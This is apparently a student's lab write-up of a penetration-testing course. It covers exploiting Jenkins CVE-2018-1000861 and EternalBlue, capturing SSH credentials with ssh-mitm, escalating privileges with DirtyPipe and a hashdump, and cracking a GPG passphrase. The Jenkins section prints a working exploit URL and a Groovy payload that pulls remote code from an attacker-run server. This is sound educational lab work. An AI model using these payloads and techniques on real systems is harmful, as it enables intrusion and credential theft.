# Software Vulnerabilities (high-level exploitations)


## Task 1: Setup infrastructure for penetration testing

Setup a minimal network architecture containing at least:
- An attacker host (could be your host OS in the goal to save compute resources)
- A vulnerable node (ideally with an RCE)
- A node that is not vulnerable (kingdom) but that we need to get credentials for (and it’s the network link that is vulnerable) or implement any other techniques to steal sensitive data/get unauthorized access
- A isolated network for kingdom or in the DMZ (choose your favorite routing solution)


## Task 2: Make an exploitation

Try and validate your chosen software vulnerability to attack a vulnerable node.
Example of old good ones working RCE vulnerabilities (you are free to find others and may be
newer):

- CVE-2015-1635 (IIS)
- CVE-2017-0144 - EternalBlue
- CVE-2018-1000861 (Jenkins)
- CVE-2019-0708 - Bluekeep
- CVE-2020-7247 (OpenSMTPD)


Explore the environment and networks as much as possible with the given access to vulnerable node. To make a PoC, one vulnerability is enough, but you are free to implement more



### Implementation:


For this one I went through CVE-2018-1000861 that is about jenkins.
I download the old version of jenkins and manually installed all the needed plugins for it (pipline, ...)

Then to see if it is vulnerable or not, lets visit "/securityRealm/user/admin" page of the jenkins:



![](https://i.imgur.com/sOeG4YD.png)



So, Okay it has the vulnerability.

Jenkins uses Groovy and Groovy is a Meta-Programming friendly language with a function that in this case can be used maliciously.
@Grape is a built-in JAR dependency management in Groovy which  help programmers import the library which are not in classPath. By using @Grab annotation, it can import the JAR file which is not in classPath during compile-time automatically! So, we can use it to run a jar file on it and give the name of the class inside jar and make it run our code. Another interesting annotation - @GrabResolver.

With this information I tried to execute a simple code on the jenkins to see how it is working. Before it, I start a simple python server on my host. I only wanted to test how it is working.

```
http://192.168.122.117:8080/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0A@GrabResolver(name=%27orange.tw%27,%20root=%27http://192.168.43.167/%27)%0A@Grab(group=%27tw.orange%27,%20module=%27poc%27,%20version=%271%27)%0Aimport%20Orange
```

The parameters without url encoding is like (it is intened to redirect it to a malicious server, my local server):

```
@GrabConfig(disableChecksums=true)
@GrabResolver(name='orange.tw', root='http://192.168.43.167/')
@Grab(group='tw.orange', module='poc', version='1')
import Orange;
```

Buuuuuut, the problem arised here, unfortunatly.



![](https://i.imgur.com/8kCLejr.png)



I tried about a day to configure it but I couldn't :((

As a result, I changed and used a "CVE-2017-0144 - EternalBlue".

For this one, I download an "ova" file for windows 2008 and tried the following steps to exploit it.

First of all, I needed to find the ip address of my vulnerable server:

```
nmap 10.1.1.0/24
```

And successfully, found.


    
![](https://i.imgur.com/Qq28XGJ.png)


I need to see the detail information about this server so:
use the following command:

```
nmap -sC -sV -Pn 10.1.1.69
```

    
![](https://i.imgur.com/f4FhZK1.png)


Using the following cammand will check if this machine has the vulnerability or not that the answer is yes.


    
![](https://i.imgur.com/HSXhPRS.png)


Then, I found a good tool to use to exploit this RCE vul. Its name is Metasploit.
finding a good module to use to exploit this vun.:


    
![](https://i.imgur.com/zLbNcZB.png)


exploit, set the vulnerable server's ip:


    
![](https://i.imgur.com/7DFmYfJ.png)


As you see, it was successful and we could go inside the server.

We are in:


    
![](https://i.imgur.com/GYTtBkr.png)




## Task 3: Attack a non-vulnerable node (kingdom)

Next, you are ready to proceed to get access on the internal network of the kingdom. To implement the attack, try to explore with which hacking tools you are able to implement this (may be something about SSH MITM?).

Kingdom-PC can be connected to any different from vulnerable node subnet, it doesn't matter. To make a PoC with one working hacking tool/technique is enough.


### Implementation:

Clarification:

```
Kingdom (server) Ip address (machine name is cluster-2):
10.1.1.49

SSH-MITM server:
10.1.1.210

```

For this one I used SSH-MITM tool, installed and ran it.

With this command I start the SSH-MITM server to listed to the "Kingdom":
```
ssh-mitm server --remote-host 10.1.1.49
```


Then imagin a scenario that client wants to connect to the server (kingdom), it doesn't know if there is a man in the middle of attack. Usally using Arp spoofing, the attacker would pretend that he is the destination server. That means client will use ip address of attacker instead of the real server with the name of server.
with this command we began client ssh to the assumed server which is the MITM server:

```
sudo ssh  -p 10022 cluster-2@10.1.1.210
```

Then mitm-server will redirect the request to the server and in that window it shows us the password we entered during this authentication for the Kingdom.


    
![](https://i.imgur.com/1qJTCPk.png)


As you can see, client correctly connected to the server (kingdom) without knowing there was someone in the middle:


    
![](https://i.imgur.com/FAEpnIg.png)



## Task 4: Privilege escalation flow (in group by two)

In this task you should chose a partner for you who has the same lab choice.
1. Choose privilege escalation scenario and setup a vulnerable node. You can use a vulnerable
node from previous tasks. If your previously chosen vulnerability can provide you a privilege
escalation attack, so just use it. Otherwise, define another one vulnerability and make it from scratch.
2. Understand the process of chosen vulnerability and describe how it works.
3. Test and validate it. If you do something with privilege escalation in Task 3, just extend the explanations here then.
4. Deliver your vulnerable instance for your partner to attack.
    4.1. After you received the partner's vulnerable node image, find out what kind of vulnerability you were proposed by your opponent teammate. It is not necessary to do a black box exploration (surely you are already exhausted by this time), so just agree with your partner about the name of the vulnerability or about other tips.
    4.2. Understand the process and describe how it works.
    4.3. Hack it.



### Implementation:

2. The RCE vulnerability allowed us to run commands on the server and using this exploitation, I could create a user privilage escalation.


I did this privilage escalation for task2 but I am going to explain it here.
First that I had the access to the victim, I checked the privilages I had:
The module I used before, automatically escalate my privilages to "SYSTEM". But, using the two other commands shown in the figure, we could do this escalation by ourselves too.


    
![](https://i.imgur.com/Cq15QIj.png)




dump users:


    
![](https://i.imgur.com/4mQYGjB.png)


This value is equal to empty pass:

```
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:
```

We can create a user:


    
![](https://i.imgur.com/ye9X1VE.png)


And then I could login using the user I created before:


    
![](https://i.imgur.com/ATHfQrk.png)

![](https://i.imgur.com/0hEa4jO.png)




    
![](https://i.imgur.com/vzNxOxj.png)



4. For this part, I recived vulnerable node from Alisher with  CVE-2022-0847-DirtyPipe-Exploit.

Then I tried the code in https://github.com/Mustafa1986/CVE-2022-0847-DirtyPipe-Exploit repository to exploit this vuln.
As you can see, I was able to have the root access.

This is a vulnerability in linux kernel that allows unprivileged local user use the Dirty Pipe flaw to write to pages in the page cache backed by read-only files and as such, escalate their privileges on the system.



![](https://i.imgur.com/GFSWLCr.png)





## Task 5: Magic video

Let's make some fun at the end. You are given the file. Find out what kind of file is what and
retrieve the message.


### Implementation:

First I checked the strings in this file and there were 2 strings looked like base64. I tried decoding, they were not base64 readable strings.

Then I asked you and I understood the first one was gpg private key with a passphrase and the second one is an ecrypted text which needed to be decrypted using the private key.

For cracking the passphrase, I used the "john the ripper" password cracker tool.

How to install the tool? Because I know in future I will need it:

```
sudo snap install john-the-ripper
sudo snap alias john-the-ripper.gpg2john gpg2john
sudo snap alias john-the-ripper my-john

```
Save the private key in the file with following header and footer:


    
![](https://i.imgur.com/MNlAnM4.png)


Using John the ribber:

First we need to decrypt cause this tool cannot work on encrypted files:

```
gpg2john private.key
```
Then breaking the password:

    
![](https://i.imgur.com/eckpaWC.png)


And thats what it returned:

```
Elvis:elviselvis:::Elvis <elvis@esreal.com>::private.key

```

Now we need to Import it and prompt password should be "elviselvis":


    
![](https://i.imgur.com/9uRh9FT.png)



Decrypting the file in this way:

```
gpg --decrypt task5.asc > plain.txt
```

And this was the hidden message:

```
elvissiguevivo
```

------------------
Refrences:

1. [SSH-MITM github link](https://github.com/ssh-mitm/ssh-mitm)
2. [SSH-MITM tool explanation](https://docs.ssh-mitm.at/quickstart.html)
3. [CVE-2017-0144---EtneralBlue-MS17-010-Remote-Code-Execution](https://github.com/EEsshq/CVE-2017-0144---EtneralBlue-MS17-010-Remote-Code-Execution)
4. [Hacking Windows with Meterpreter](https://www.coengoedegebure.com/hacking-windows-with-meterpreter/)
5. 
